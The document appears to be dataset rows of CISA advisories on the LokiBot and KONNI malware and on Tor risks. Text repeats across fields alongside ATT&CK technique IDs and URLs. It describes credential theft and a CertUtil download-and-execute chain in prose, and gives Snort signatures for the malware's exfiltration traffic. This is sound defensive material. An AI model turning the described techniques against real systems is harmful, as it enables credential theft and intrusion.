Credentials from Password Stores: Credentials from Web Browsers [T1555.003]


LokiBot has demonstrated the ability to steal credentials from multiple applications and data sources including Safari and Chromium and Mozilla Firefox-based web browsers.




Hide Artifacts: Hidden Files and Directories [T1564.001]


LokiBot has the ability to copy itself to a hidden file and directory.




Detection
Signatures
CISA developed the following Snort signature for use in detecting network activity associated with LokiBot activity.
alert tcp any any -> any $HTTP_PORTS (msg:""Lokibot:HTTP URI POST contains '/*/fre.php' post-infection""; flow:established,to_server; flowbits:isnotset,.tagged; content:""/fre.php""; http_uri; fast_pattern:only; urilen:<50,norm; content:""POST""; nocase; http_method; pcre:""/\/(?:alien|loky\d|donep|jemp|lokey|new2|loki|Charles|sev7n|dbwork|scroll\/NW|wrk|job|five\d?|donemy|animation\dkc|love|Masky|v\d|lifetn|Ben)\/fre\.php$/iU""; flowbits:set,.tagged;classtype:http-uri; metadata:service http; metadata:pattern HTTP-P001,)

Mitigations

CISA and MS-ISAC recommend that federal, state, local, tribal, territorial government, private sector users, and network administrators consider applying the following best practices to strengthen the security posture of their organization's systems. System owners and administrators should review any configuration changes prior to implementation to avoid unwanted impacts.

Maintain up-to-date antivirus signatures and engines. See Protecting Against Malicious Code.
Keep operating system patches up to date. See Understanding Patches and Software Updates.
Disable file and printer sharing services. If these services are required, use strong passwords or Active Directory authentication.
Enforce multi-factor authentication. See Supplementing Passwords for more information.
Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators’ group unless required.
Enforce a strong password policy. See Choosing and Protecting Passwords.
Exercise caution when opening email attachments, even if the attachment is expected and the sender appears to be known. See Using Caution with Email Attachments.
Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.
Disable unnecessary services on agency workstations and servers.
Scan for and remove suspicious email attachments; ensure the scanned attachment is its ""true file type"" (i.e., the extension matches the file header).
Monitor users' web browsing habits; restrict access to sites with unfavorable content.
Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs).
Scan all software downloaded from the internet prior to executing.
Maintain situational awareness of the latest threats and implement appropriate access control lists.
Visit the MITRE ATT&CK Techniques pages (linked in table 1 above) for additional mitigation and detection strategies.

For additional information on malware incident prevention and handling, see the National Institute of Standards and Technology Special Publication 800-83, Guide to Malware Incident Prevention and Handling for Desktops and Laptops.
Resources
Center for Internet Security Security Event Primer – Malware: https://www.cisecurity.org/white-papers/security-event-primer-malware/
MITRE ATT&CK – LokiBot: https://attack.mitre.org/software/S0447/
MITRE ATT&CK for Enterprise: https://attack.mitre.org/matrices/enterprise/

References

[1] Trend Micro: LokiBot Impersonates Popular Game Launcher and Drops Compiled C# Code File 
[2] Fortinet: Newly Discovered Infostealer Attack Uses LokiBot 
[3] ZDNet: LokiBot Malware Now Hides its Source Code in Image Files
[4] SecurityWeek: LokiBot and NanoCore Malware Distributed in ISO Image Files
[5] Netskope: LokiBot & NanoCore being distributed via ISO disk image files 
[6] Trend Micro: Attack Using Windows Installer Leads to LokiBot
[7] BleepingComputer: LokiBot Android Banking Trojan Turns Into Ransomware When You Try to Remove It
[8] Fortinet: New Loki Variant Being Spread via PDF File
[9] Check Point: Preinstalled Malware Targeting Mobile Users
[10] BleepingComputer: Loki Trojan Infects Android Libraries and System Process to Get Root Privileges
[11] New Jersey Cybersecurity & Communications Integration Cell: LokiBot  

Revisions

September 22, 2020: Initial Version|September 23, 2020: Added hyperlink to MS-ISAC






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1041', 'T1055.012', 'T1027.002', 'T1546.008', 'T1056.001', 'T1071.001', 'T1027', 'T1082', 'T1564.001', 'T1555.003', 'T1033', 'T1204.002', 'T1555', 'T1016'}","




Summary

This Alert uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework. See the ATT&CK for Enterprise frameworks for all referenced threat actor techniques.
This product was written by the Cybersecurity and Infrastructure Security Agency (CISA) with contributions by the Multi-State Information Sharing & Analysis Center (MS-ISAC).
CISA has observed a notable increase in the use of LokiBot malware by malicious cyber actors since July 2020. Throughout this period, CISA’s EINSTEIN Intrusion Detection System, which protects federal, civilian executive branch networks, has detected persistent malicious LokiBot activity. LokiBot uses a credential- and information-stealing malware, often sent as a malicious attachment and known for being simple, yet effective, making it an attractive tool for a broad range of cyber actors across a wide variety of data compromise use cases.

Technical Details

LokiBot—also known as Lokibot, Loki PWS, and Loki-bot—employs Trojan malware to steal sensitive information such as usernames, passwords, cryptocurrency wallets, and other credentials.

The malware steals credentials through the use of a keylogger to monitor browser and desktop activity (Credentials from Password Stores,).

(Credentials from Password Stores: Credentials from Web Browsers,)
(Input Capture: Keylogging,)


LokiBot can also create a backdoor into infected systems to allow an attacker to install additional payloads (Event Triggered Execution: Accessibility Features,).
Malicious cyber actors typically use LokiBot to target Windows and Android operating systems and distribute the malware via email, malicious websites, text, and other private messages (User Execution: Malicious File,). See figure 1 for enterprise techniques used by LokiBot.

​
Figure 1: MITRE ATT&CK enterprise techniques used by LokiBot
Since LokiBot was first reported in 2015, cyber actors have used it across a range of targeted applications, including the following.

February 2020: Trend Micro identified cyber actors using LokiBot to impersonate a launcher for Fortnite—a popular video game.,1,
August 2019: FortiGuard SE researchers discovered a malspam campaign distributing LokiBot information-stealing payloads in spearphishing attack on a U.S. manufacturing company.,2,
August 2019: Trend Micro researchers reported LokiBot malware source code being hidden in image files spread as attachments in phishing emails.,3,
June 2019: Netskope uncovered LokiBot being distributed in a malspam campaign using ISO image file attachments.,4,
April 2019: Netskope uncovered a phishing campaign using malicious email attachments with LokiBot malware to create backdoors onto infected Windows systems and steal sensitive information.,5,
February 2018: Trend Micro discovered CVE-2017-11882 being exploited in an attack using Windows Installer service to deliver LokiBot malware.,6,
October 2017: SfyLabs identified cyber actors using LokiBot as an Android banking trojan that turns into ransomware.,7,
May 2017: Fortinet reported malicious actors using a PDF file to spread a new LokiBot variant capable of stealing credentials from more than 100 different software tools.,8,
March 2017: Check Point discovered LokiBot malware found pre-installed on Android devices.,9,
December 2016: Dr.Web researchers identified a new LokiBot variant targeting Android core libraries.,10,
February 2016: Researchers discovered the LokiBot Android Trojan infecting the core Android operating system processes.,11,

MITRE ATT&CK Techniques
According to MITRE, LokiBot uses the ATT&CK techniques listed in table 1.
Table 1: LokiBot ATT&CK techniques 

Detection
Signatures
CISA developed the following Snort signature for use in detecting network activity associated with LokiBot activity.
alert tcp any any -> any $HTTP_PORTS (msg:""Lokibot:HTTP URI POST contains '/*/fre.php' post-infection""; flow:established,to_server; flowbits:isnotset,.tagged; content:""/fre.php""; http_uri; fast_pattern:only; urilen:<50,norm; content:""POST""; nocase; http_method; pcre:""/\/(?:alien|loky\d|donep|jemp|lokey|new2|loki|Charles|sev7n|dbwork|scroll\/NW|wrk|job|five\d?|donemy|animation\dkc|love|Masky|v\d|lifetn|Ben)\/fre\.php$/iU""; flowbits:set,.tagged;classtype:http-uri; metadata:service http; metadata:pattern HTTP-P001,)

Mitigations

CISA and MS-ISAC recommend that federal, state, local, tribal, territorial government, private sector users, and network administrators consider applying the following best practices to strengthen the security posture of their organization's systems. System owners and administrators should review any configuration changes prior to implementation to avoid unwanted impacts.

Maintain up-to-date antivirus signatures and engines. See Protecting Against Malicious Code.
Keep operating system patches up to date. See Understanding Patches and Software Updates.
Disable file and printer sharing services. If these services are required, use strong passwords or Active Directory authentication.
Enforce multi-factor authentication. See Supplementing Passwords for more information.
Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators’ group unless required.
Enforce a strong password policy. See Choosing and Protecting Passwords.
Exercise caution when opening email attachments, even if the attachment is expected and the sender appears to be known. See Using Caution with Email Attachments.
Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.
Disable unnecessary services on agency workstations and servers.
Scan for and remove suspicious email attachments; ensure the scanned attachment is its ""true file type"" (i.e., the extension matches the file header).
Monitor users' web browsing habits; restrict access to sites with unfavorable content.
Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs).
Scan all software downloaded from the internet prior to executing.
Maintain situational awareness of the latest threats and implement appropriate access control lists.
Visit the MITRE ATT&CK Techniques pages (linked in table 1 above) for additional mitigation and detection strategies.

For additional information on malware incident prevention and handling, see the National Institute of Standards and Technology Special Publication 800-83, Guide to Malware Incident Prevention and Handling for Desktops and Laptops.
Resources
Center for Internet Security Security Event Primer – Malware: https://www.cisecurity.org/white-papers/security-event-primer-malware/
MITRE ATT&CK – LokiBot: https://attack.mitre.org/software/S0447/
MITRE ATT&CK for Enterprise: https://attack.mitre.org/matrices/enterprise/

References,1, Trend Micro: LokiBot Impersonates Popular Game Launcher and Drops Compiled C# Code File,2, Fortinet: Newly Discovered Infostealer Attack Uses LokiBot,3, ZDNet: LokiBot Malware Now Hides its Source Code in Image Files,4, SecurityWeek: LokiBot and NanoCore Malware Distributed in ISO Image Files,5, Netskope: LokiBot & NanoCore being distributed via ISO disk image files,6, Trend Micro: Attack Using Windows Installer Leads to LokiBot,7, BleepingComputer: LokiBot Android Banking Trojan Turns Into Ransomware When You Try to Remove It,8, Fortinet: New Loki Variant Being Spread via PDF File,9, Check Point: Preinstalled Malware Targeting Mobile Users,10, BleepingComputer: Loki Trojan Infects Android Libraries and System Process to Get Root Privileges,11, New Jersey Cybersecurity & Communications Integration Cell: LokiBot  

Revisions

September 22, 2020: Initial Version|September 23, 2020: Added hyperlink to MS-ISAC






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-266a
75,"




Summary

This Alert uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework. See the ATT&CK for Enterprise framework for all referenced threat actor techniques.
The Cybersecurity and Infrastructure Security Agency (CISA) has observed cyber actors using emails containing a Microsoft Word document with a malicious Visual Basic Application (VBA) macro code to deploy KONNI malware. KONNI is a remote administration tool (RAT) used by malicious cyber actors to steal files, capture keystrokes, take screenshots, and execute arbitrary code on infected hosts.

Technical Details

KONNI malware is often delivered via phishing emails as a Microsoft Word document with a malicious VBA macro code (Phishing: Spearphising Attachment [T1566.001]). The malicious code can change the font color from light grey to black (to fool the user to enable content), check if the Windows operating system is a 32-bit or 64-bit version, and construct and execute the command line to download additional files (Command and Scripting Interpreter: Windows Command Shell [T1059.003]).
Once the VBA macro constructs the command line, it uses the certificate database tool CertUtil to download remote files from a given Uniform Resource Locator. It also incorporates a built-in function to decode base64-encoded files. The Command Prompt silently copies certutil.exe into a temp directory and renames it to evade detection.
The cyber actor then downloads a text file from a remote resource containing a base64-encoded string that is decoded by CertUtil and saved as a batch (.BAT) file. Finally, the cyber actor deletes the text file from the temp directory and executes the .BAT file.
MITRE ATT&CK Techniques
According to MITRE, KONNI uses the ATT&CK techniques listed in table 1.
Table 1: KONNI ATT&CK techniques



Technique
Use





System Network Configuration Discovery [T1016]


KONNI can collect the Internet Protocol address from the victim’s machine.




System Owner/User Discovery [T1033]


KONNI can collect the username from the victim’s machine.




Masquerading: Match Legitimate Name or Location [T1036.005]


KONNI creates a shortcut called Anti virus service.lnk in an apparent attempt to masquerade as a legitimate file.




Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol [T1048.003]


KONNI has used File Transfer Protocol to exfiltrate reconnaissance data out.




Input Capture: Keylogging  [T1056.001]


KONNI has the capability to perform keylogging.




Process Discovery [T1057]


KONNI has used tasklist.exe to get a snapshot of the current processes’ state of the target machine.




Command and Scripting Interpreter: PowerShell [T1059.001]


KONNI used PowerShell to download and execute a specific 64-bit version of the malware.




Command and Scripting Interpreter: Windows Command Shell  [T1059.003]


KONNI has used cmd.exe to execute arbitrary commands on the infected host across different stages of the infection change.




Indicator Removal on Host: File Deletion [T1070.004]


KONNI can delete files.




Application Layer Protocol: Web Protocols [T1071.001]


KONNI has used Hypertext Transfer Protocol for command and control.




System Information Discovery [T1082]


KONNI can gather the operating system version, architecture information, connected drives, hostname, and computer name from the victim’s machine and has used systeminfo.exe to get a snapshot of the current system state of the target machine.




File and Directory Discovery [T1083]


A version of KONNI searches for filenames created with a previous version of the malware, suggesting different versions targeted the same victims and the versions may work together.




Ingress Tool Transfer [T1105]


KONNI can download files and execute them on the victim’s machine.




Modify Registry [T1112]


KONNI has modified registry keys of ComSysApp service and Svchost on the machine to gain persistence.




Screen Capture [T1113]


KONNI can take screenshots of the victim’s machine.




Clipboard Data [T1115]


KONNI had a feature to steal data from the clipboard.




Data Encoding: Standard Encoding [T1132.001]


KONNI has used a custom base64 key to encode stolen data before exfiltration.




Access Token Manipulation: Create Process with Token [T1134.002]


KONNI has duplicated the token of a high integrity process to spawn an instance of cmd.exe under an impersonated user.




Deobfuscate/Decode Files or Information [T1140]


KONNI has used CertUtil to download and decode base64 encoded strings.




Signed Binary Proxy Execution: Rundll32 [T1218.011]


KONNI has used Rundll32 to execute its loader for privilege escalation purposes.




Event Triggered Execution: Component Object Model Hijacking [T1546.015]


KONNI has modified ComSysApp service to load the malicious DLL payload.




Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder [T1547.001]


A version of KONNI drops a Windows shortcut into the Startup folder to establish persistence.




Boot or Logon Autostart Execution: Shortcut Modification [T1547.009]


A version of KONNI drops a Windows shortcut on the victim’s machine to establish persistence.




Abuse Elevation Control Mechanism: Bypass User Access Control [T1548.002]


KONNI bypassed User Account Control with the ""AlwaysNotify"" settings.




Credentials from Password Stores: Credentials from Web Browsers [T1555.003]


KONNI can steal profiles (containing credential information) from Firefox, Chrome, and Opera.




Detection
Signatures
CISA developed the following Snort signatures for use in detecting KONNI malware exploits.
alert tcp any any -> any $HTTP_PORTS (msg:""HTTP URI contains '/weget/*.php' (KONNI)""; sid:1; rev:1; flow:established,to_server; content:""/weget/""; http_uri; depth:7; offset:0; fast_pattern; content:"".php""; http_uri; distance:0; within:12; content:!""Referrer|3a 20|""; http_header; classtype:http-uri; priority:2; metadata:service http;)
alert tcp any any -> any $HTTP_PORTS (msg:""KONNI:HTTP header contains 'User-Agent|3a 20|HTTP|0d 0a|'""; sid:1; rev:1; flow:established,to_server; content:""User-Agent|3a 20|HTTP|0d 0a|""; http_header; fast_pattern:only; content:""POST""; nocase; http_method; classtype:http-header; priority:2; metadata:service http;)
alert tcp any any -> any $HTTP_PORTS (msg:""KONNI:HTTP URI contains '/weget/(upload|uploadtm|download)'""; sid:1; rev:1; flow:established,to_server; content:""/weget/""; http_uri; fast_pattern:only; pcre:""/^\/weget\x2f(?:upload|uploadtm|download)\.php/iU""; content:""POST""; http_method; classtype:http-uri; priority:2; reference:url,blog.talosintelligence.com/2017/07/konni-references-north-korean-missile-capabilities.html; metadata:service http;)

Mitigations

CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.

Maintain up-to-date antivirus signatures and engines. See Protecting Against Malicious Code.
Keep operating system patches up to date. See Understanding Patches and Software Updates.
Disable file and printer sharing services. If these services are required, use strong passwords or Active Directory authentication.
Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators’ group unless required.
Enforce a strong password policy. See Choosing and Protecting Passwords.
Exercise caution when opening email attachments, even if the attachment is expected and the sender appears to be known. See Using Caution with Email Attachments.
Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.
Disable unnecessary services on agency workstations and servers.
Scan for and remove suspicious email attachments; ensure the scanned attachment is its ""true file type"" (i.e., the extension matches the file header).
Monitor users' web browsing habits; restrict access to sites with unfavorable content.
Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs).
 Scan all software downloaded from the internet prior to executing.
Maintain situational awareness of the latest threats and implement appropriate access control lists.
Visit the MITRE ATT&CK Techniques pages (linked in table 1 above) for additional mitigation and detection strategies.

For additional information on malware incident prevention and handling, see the National Institute of Standards and Technology Special Publication 800-83, ""Guide to Malware Incident Prevention and Handling for Desktops and Laptops.""
Resources

d-hunter – A Look Into KONNI 2019 Campaign
MITRE ATT&CK – KONNI 
MITRE ATT&CK for Enterprise


Revisions

August 14, 2020: Initial Version






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1083', 'T1016', 'T1036.005', 'T1105', 'T1082', 'T1112', 'T1113', 'T1115', 'T1546.015', 'T1140', 'T1134.002', 'T1132.001', 'T1070.004', 'T1218.011', 'T1056.001', 'T1057', 'T1566.001', 'T1048.003', 'T1059.001', 'T1033', 'T1547.001', 'T1071.001', 'T1547.009', 'T1059.003', 'T1555.003', 'T1548.002'}","




Summary

This Alert uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework. See the ATT&CK for Enterprise framework for all referenced threat actor techniques.
The Cybersecurity and Infrastructure Security Agency (CISA) has observed cyber actors using emails containing a Microsoft Word document with a malicious Visual Basic Application (VBA) macro code to deploy KONNI malware. KONNI is a remote administration tool (RAT) used by malicious cyber actors to steal files, capture keystrokes, take screenshots, and execute arbitrary code on infected hosts.

Technical Details

KONNI malware is often delivered via phishing emails as a Microsoft Word document with a malicious VBA macro code (Phishing: Spearphising Attachment,). The malicious code can change the font color from light grey to black (to fool the user to enable content), check if the Windows operating system is a 32-bit or 64-bit version, and construct and execute the command line to download additional files (Command and Scripting Interpreter: Windows Command Shell,).
Once the VBA macro constructs the command line, it uses the certificate database tool CertUtil to download remote files from a given Uniform Resource Locator. It also incorporates a built-in function to decode base64-encoded files. The Command Prompt silently copies certutil.exe into a temp directory and renames it to evade detection.
The cyber actor then downloads a text file from a remote resource containing a base64-encoded string that is decoded by CertUtil and saved as a batch (.BAT) file. Finally, the cyber actor deletes the text file from the temp directory and executes the .BAT file.
MITRE ATT&CK Techniques
According to MITRE, KONNI uses the ATT&CK techniques listed in table 1.
Table 1: KONNI ATT&CK techniques

Detection
Signatures
CISA developed the following Snort signatures for use in detecting KONNI malware exploits.
alert tcp any any -> any $HTTP_PORTS (msg:""HTTP URI contains '/weget/*.php' (KONNI)""; sid:1; rev:1; flow:established,to_server; content:""/weget/""; http_uri; depth:7; offset:0; fast_pattern; content:"".php""; http_uri; distance:0; within:12; content:!""Referrer|3a 20|""; http_header; classtype:http-uri; priority:2; metadata:service http;)
alert tcp any any -> any $HTTP_PORTS (msg:""KONNI:HTTP header contains 'User-Agent|3a 20|HTTP|0d 0a|'""; sid:1; rev:1; flow:established,to_server; content:""User-Agent|3a 20|HTTP|0d 0a|""; http_header; fast_pattern:only; content:""POST""; nocase; http_method; classtype:http-header; priority:2; metadata:service http;)
alert tcp any any -> any $HTTP_PORTS (msg:""KONNI:HTTP URI contains '/weget/(upload|uploadtm|download)'""; sid:1; rev:1; flow:established,to_server; content:""/weget/""; http_uri; fast_pattern:only; pcre:""/^\/weget\x2f(?:upload|uploadtm|download)\.php/iU""; content:""POST""; http_method; classtype:http-uri; priority:2; reference:url,blog.talosintelligence.com/2017/07/konni-references-north-korean-missile-capabilities.html; metadata:service http;)

Mitigations

CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.

Maintain up-to-date antivirus signatures and engines. See Protecting Against Malicious Code.
Keep operating system patches up to date. See Understanding Patches and Software Updates.
Disable file and printer sharing services. If these services are required, use strong passwords or Active Directory authentication.
Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators’ group unless required.
Enforce a strong password policy. See Choosing and Protecting Passwords.
Exercise caution when opening email attachments, even if the attachment is expected and the sender appears to be known. See Using Caution with Email Attachments.
Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.
Disable unnecessary services on agency workstations and servers.
Scan for and remove suspicious email attachments; ensure the scanned attachment is its ""true file type"" (i.e., the extension matches the file header).
Monitor users' web browsing habits; restrict access to sites with unfavorable content.
Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs).
 Scan all software downloaded from the internet prior to executing.
Maintain situational awareness of the latest threats and implement appropriate access control lists.
Visit the MITRE ATT&CK Techniques pages (linked in table 1 above) for additional mitigation and detection strategies.

For additional information on malware incident prevention and handling, see the National Institute of Standards and Technology Special Publication 800-83, ""Guide to Malware Incident Prevention and Handling for Desktops and Laptops.""
Resources

d-hunter – A Look Into KONNI 2019 Campaign
MITRE ATT&CK – KONNI 
MITRE ATT&CK for Enterprise


Revisions

August 14, 2020: Initial Version






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-227a
76,"




Summary

This advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) and Pre-ATT&CK framework. See the ATT&CK for Enterprise and Pre-ATT&CK frameworks for referenced threat actor techniques.
This advisory—written by the Cybersecurity Security and Infrastructure Security Agency (CISA) with contributions from the Federal Bureau of Investigation (FBI)—highlights risks associated with Tor, along with technical details and recommendations for mitigation. Cyber threat actors can use Tor software and network infrastructure for anonymity and obfuscation purposes to clandestinely conduct malicious cyber operations.[1],[2],[3]
Tor (aka The Onion Router) is software that allows users to browse the web anonymously by encrypting and routing requests through multiple relay layers or nodes. This software is maintained by the Tor Project, a nonprofit organization that provides internet anonymity and anti-censorship tools. While Tor can be used to promote democracy and free, anonymous use of the internet, it also provides an avenue for malicious actors to conceal their activity because identity and point of origin cannot be determined for a Tor software user. Using the Onion Routing Protocol, Tor software obfuscates a user’s identity from anyone seeking to monitor online activity (e.g., nation states, surveillance organizations, information security tools). This is possible because the online activity of someone using Tor software appears to originate from the Internet Protocol (IP) address of a Tor exit node, as opposed to the IP address of the user’s computer.
CISA and the FBI recommend that organizations assess their individual risk of compromise via Tor and take appropriate mitigations to block or closely monitor inbound and outbound traffic from known Tor nodes.
Click here for a PDF version of this report.

Risk Evaluation

Malicious cyber actors use Tor to mask their identity when engaging in malicious cyber activity impacting the confidentiality, integrity, and availability of an organization’s information systems and data. Examples of this activity include performing reconnaissance, penetrating systems, exfiltrating and manipulating data, and taking services offline through denial-of-service attacks and delivery of ransomware payloads. Threat actors have relayed their command and control (C2) server communications—used to control systems infected with malware—through Tor, obscuring the identity (location and ownership) of those servers.
The use of Tor in this context allows threat actors to remain anonymous, making it difficult for network defenders and authorities to perform system recovery and respond to cyberattacks. Organizations that do not take steps to block or monitor Tor traffic are at heightened risk of being targeted and exploited by threat actors hiding their identity and intentions using Tor.
The risk of being the target of malicious activity routed through Tor is unique to each organization. An organization should determine its individual risk by assessing the likelihood that a threat actor will target its systems or data and the probability of the threat actor’s success given current mitigations and controls. This assessment should consider legitimate reasons that non-malicious users may prefer to, or need to, use Tor for accessing the network. Organizations should evaluate their mitigation decisions against threats to their organization from advanced persistent threats (APTs), moderately sophisticated attackers, and low-skilled individual hackers, all of whom have leveraged Tor to carry out reconnaissance and attacks in the past.

Technical Details

Tor obfuscates the source and destination of a web request. This allows users to conceal information about their activities on the web—such as their location and network usage—from the recipients of that traffic, as well as third parties who may conduct network surveillance or traffic analysis. Tor encrypts a user’s traffic and routes the traffic through at least three Tor nodes, or relays, so that the user’s starting IP address and request is masked from network and traffic observers during transit. Once the request reaches its intended destination, it exits Tor through a public Tor exit node. Anyone conducting monitoring or analysis will only see the traffic coming from the Tor exit node and will not be able to determine the original IP address of the request.
 

Figure 1: Malicious tactics and techniques aided by Tor, mapped to the MITRE ATT&CK framework
Malicious Tactics and Techniques Aided by Tor
Threat actors use Tor to create a layer of anonymity to conceal malicious activity at different stages of network compromise. Their tactics and techniques—illustrated in figure 1 above—include:
Pre-ATT&CK

Target Selection [TA0014]
Technical Information Gathering [TA0015]

Conduct Active Scanning [T1254]
Conduct Passive Scanning [T1253]
Determine domain and IP address space [T1250]
Identify security defensive capabilities [T1263]


Technical Weakness Identification [TA0018]

ATT&CK

Initial Access [TA0001]

Exploit Public-Facing Applications [T1190]


Command and Control [TA0011]

Commonly Used Port [T1043]
Connection Proxy [T1090]
Custom Command and Control Protocol [T1094]
Custom Cryptographic Protocol [T1024]
Multi-hop Proxy [T1188]
Multilayer Encryption [T1079]
Standard Application Layer Protocol [T1071]


Exfiltration [TA0010]
Impact [TA0040]

Data Encrypted for Impact [T1486]
Endpoint Denial of Service [T1499]
Network Denial of Service [T1498]



Key Indicators of Malicious Activity via Tor
While Tor obfuscates a user from being identified through standard security tools, network defenders can leverage various network, endpoint, and security appliance logs to detect the use of Tor, including potentially malicious activity involving Tor, through indicator- or behavior-based analysis.
Using an indicator-based approach, network defenders can leverage security information and event management (SIEM) tools and other log analysis platforms to flag suspicious activities involving the IP addresses of Tor exit nodes. The list of Tor exit node IP addresses is actively maintained by the Tor Project’s Exit List Service, which offers both real-time query and bulk download interfaces (see https://blog.torproject.org/changes-tor-exit-list-service). Organizations preferring bulk download may consider automated data ingest solutions, given the highly dynamic nature of the Tor exit list, which is updated hourly. Network defenders should closely inspect evidence of substantial transactions with Tor exit nodes—revealed in netflow, packet capture (PCAP), and web server logs—to infer the context of the activity and to discern any malicious behavior that could represent reconnaissance, exploitation, C2, or data exfiltration.
Using a behavior-based approach, network defenders can uncover suspicious Tor activity by searching for the operational patterns of Tor client software and protocols. Transmission Control Protocol (TCP) and User Datagram Protocol (UDP) ports commonly affiliated with Tor include 9001, 9030, 9040, 9050, 9051, and 9150. Highly structured Domain Name Service (DNS) queries for domain names ending with the suffix torproject.org is another behavior exhibited by hosts running Tor software. In addition, DNS queries for domains ending in .onion is a behavior exhibited by misconfigured Tor clients, which may be attempting to beacon to malicious Tor hidden services.
Organizations should research and enable the pre-existing Tor detection and mitigation capabilities within their existing endpoint and network security solutions, as these often employ effective detection logic. Solutions such as web application firewalls, router firewalls, and host/network intrusion detection systems may already provide some level of Tor detection capability.

Mitigations

Organizations can implement mitigations of varying complexity and restrictiveness to reduce the risk posed by threat actors who use Tor to carry out malicious activities. However, mitigation actions can also impact the access of legitimate users who leverage Tor to protect their privacy when visiting an organization’s internet-facing assets. Organizations should evaluate their probable risk, available resources, and impact to legitimate, non-malicious, Tor users before applying mitigation actions. 

Most restrictive approach: Block all web traffic to and from public Tor entry and exit nodes. Organizations that wish to take a conservative or less resource-intensive approach to reduce the risk posed by threat actors’ use of Tor should implement tools that restrict all traffic—malicious and legitimate—to and from Tor entry and exit nodes. Of note, blocking known Tor nodes does not completely eliminate the threat of malicious actors using Tor for anonymity, as additional Tor network access points, or bridges, are not all listed publicly. See table 1 for the most restrictive mitigation practices.



Table 1: Most restrictive mitigation practices



Type
Level of Effort
Technical Implementation

Impact 



Baseline Activity
Low/Medium

Require organization to maintain up-to-date lists of known Tor exit and entry node IP addresses.
Public lists are available on the internet, but frequency of updates and accuracy varies depending on the source. The Tor Project maintains an authoritative list. 

Up-to-date awareness of known Tor nodes to enable blocking


External Policies
Medium

Set external policies to block incoming traffic from known Tor exit nodes to prevent malicious reconnaissance and exploit attempts.
Network security tools (e.g., next-generation firewalls, proxies) may have configuration settings to apply these policies.

Block inbound network traffic, both malicious and legitimate, from reaching the organization’s domain from known Tor exit nodes


Internal Policies
Medium

Set internal policies to block outgoing traffic to Tor entry nodes to prevent data exfiltration and C2 traffic.
Network security tools (e.g., next-generation firewalls, proxies) may have configuration settings to apply these policies.

Block outbound network traffic, both malicious and legitimate, from leaving the organization’s domain into known Tor entry nodes



 

Less restrictive approach: Tailor monitoring, analysis, and blocking of web traffic to and from public Tor entry and exit nodes. There are instances in which legitimate users may leverage Tor for internet browsing and other non-malicious purposes. For example, deployed military or other overseas voters may use Tor as part of the voting process to escape monitoring by foreign governments. Such users may use Tor when visiting elections-related websites, to check voter registration status, or to mark and then cast absentee ballots via email or web portal. Similarly, some users may use Tor to avoid tracking by advertisers when browsing the internet. Organizations that do not wish to block legitimate traffic to/from Tor entry/exit nodes should consider adopting practices that allow for network monitoring and traffic analysis for traffic from those nodes, and then consider appropriate blocking. This approach can be resource intensive but will allow greater flexibility and adaptation of defensive.



Table 2: Less restrictive mitigation practices



Type
Level of Effort
Technical Implementation
Impact


Known Tor Nodes
Low/Medium

Require the organization to maintain up-to-date lists of known Tor exit and entry node IP addresses.
The Tor Project maintains an authoritative list. 

Up-to-date awareness of known Tor nodes to enable baselining/allow blocking


SIEM Correlation
Low/Medium
Integrate network security and SIEM tools that correlate logs.
Enhanced understanding of legitimate/expected Tor use for inbound/outbound traffic


Baseline
Medium

Analyze traffic to determine normal patterns of behavior; legitimate vs. anomalous uses of Tor.
Baseline existing Tor traffic to/from known entry/exit nodes over a period of months.
Inspect traffic to understand legitimate traffic; level-set the organization’s risk tolerance for blocking or allowing Tor traffic to/from specific services.

Baseline understanding of legitimate vs. potentially anomalous Tor uses.


Internal / External Policies
Medium/High

Institute behavioral signatures/rules to block unexpected/potentially malicious activity and allow legitimate activity.
Examine activity between any ephemeral port and Tor IP—this could be malicious data exfiltration or C2 traffic (except where use of outbound Tor entry nodes is expected).
Monitor for use of TCP/UDP ports 9001, 9030, 9040, 9050, 9051, 9150, and TCP ports 443* and 8443.
Monitor and/or block inbound connections from Tor exit nodes to IP addresses and ports for which external connections are not expected (i.e., other than VPN gateways, mail ports, web ports).
Associated ports are applicable for client -> guard/relay traffic monitoring and analysis but not monitoring for exit node -> a network destination.
Monitor and examine any large dataflows between networks and Tor IP addresses, regardless of port, as this could be unauthorized data exfiltration.
*Since port 443 is the most common port for secure web traffic, generically monitoring 443 may produce a high volume of false positives; network traffic tools can be used to assist in this analysis.

Legitimate traffic via Tor entry/exit nodes is permitted and unexpected/potentially malicious activity via Tor entry/exit nodes is blocked



 

Blended approach: Block all Tor traffic to some resources, allow and monitor for others. Given the various licit and illicit uses of Tor, a blended approach may be an appropriate risk mitigation strategy for some organizations (i.e., intentionally allowing traffic to/from Tor only for specific websites and services where legitimate use may be expected and blocking all Tor traffic to/from non-excepted processes/services). This may require continuous re-evaluation as an entity considers its own risk tolerance associated with different applications. The level of effort to implement this approach is high.

Considerations for Blocking Use of Tor
